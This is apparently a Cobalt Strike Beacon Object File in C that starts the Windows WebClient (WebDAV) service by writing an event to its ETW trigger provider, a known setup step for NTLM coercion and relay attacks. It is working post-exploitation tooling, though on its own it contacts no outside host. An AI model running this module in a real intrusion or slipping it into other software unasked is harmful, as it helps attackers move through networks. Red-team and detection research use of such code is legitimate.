#include <windows.h>
#include <evntprov.h>
#include "beacon.h"

// EnableWebDAVClient Code based on https://pentestlab.blog/tag/webdav/page/2/

//ADVAPI32
DECLSPEC_IMPORT ULONG EVNTAPI ADVAPI32$EventRegister(LPCGUID ProviderId, PENABLECALLBACK EnableCallback, PVOID CallbackContext, PREGHANDLE RegHandle);
DECLSPEC_IMPORT ULONG EVNTAPI ADVAPI32$EventWrite(REGHANDLE RegHandle, PCEVENT_DESCRIPTOR EventDescriptor, ULONG UserDataCount, PEVENT_DATA_DESCRIPTOR UserData);
DECLSPEC_IMPORT ULONG EVNTAPI ADVAPI32$EventUnregister(REGHANDLE RegHandle);

VOID go(char* args, int length)
{
    ULONG status = ERROR_SUCCESS;
    REGHANDLE RegistrationHandle;

    const GUID _MS_Windows_WebClntLookupServiceTrigger_Provider = { 0x22B6D684, 0xFA63, 0x4578, { 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7 } };
    status = ADVAPI32$EventRegister(&_MS_Windows_WebClntLookupServiceTrigger_Provider,NULL, NULL, &RegistrationHandle); 
    if (status == ERROR_SUCCESS)
    {

        EVENT_DESCRIPTOR desc;
        EventDescCreate(&desc, 1, 0, 0, 4, 0, 0, 0);
        status = ADVAPI32$EventWrite(RegistrationHandle, &desc, 0, NULL);

        if (status == ERROR_SUCCESS)
        {
            ADVAPI32$EventUnregister(RegistrationHandle);
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to write event with status = 0x%x\n", status);
        }
        
    }else{
        BeaconPrintf(CALLBACK_ERROR, "Failed to register event with status = 0x%x\n", status);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "WebClient Service Enabled! \n");
    return;
}